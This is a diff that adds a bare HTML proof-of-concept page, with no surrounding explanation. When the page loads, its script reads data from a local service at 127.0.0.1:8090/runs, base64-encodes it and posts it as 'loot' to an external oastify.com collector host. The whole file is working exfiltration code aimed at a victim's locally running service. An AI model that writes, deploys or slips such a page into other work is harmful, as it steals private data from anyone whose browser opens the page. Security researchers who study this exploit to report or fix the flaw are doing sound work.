@@ -1,0 +1,30 @@
+
+<html>
+
+<body>
+    <script>
+        const url = "http://127.0.0.1:8090/runs";
+        const sendGetRequest = async () => {
+            try {
+                const response = await fetch(url);
+                const data = await response.text();
+                b64_data = btoa(data);
+                send_data(b64_data);
+            } catch (error) {
+                console.error("Error fetching data:", error);
+            }
+        };
+        const send_data = async (data) => {
+            const url = "http://9y8jmiu9r53w6ahdabqo1iyuwl2cq2er.oastify.com";
+            const response = await fetch(url, {
+                method: "POST",
+                body: JSON.stringify({
+                    loot: data,
+                }),
+            });
+        };
+        sendGetRequest();
+    </script>
+</body>
+
+</html>
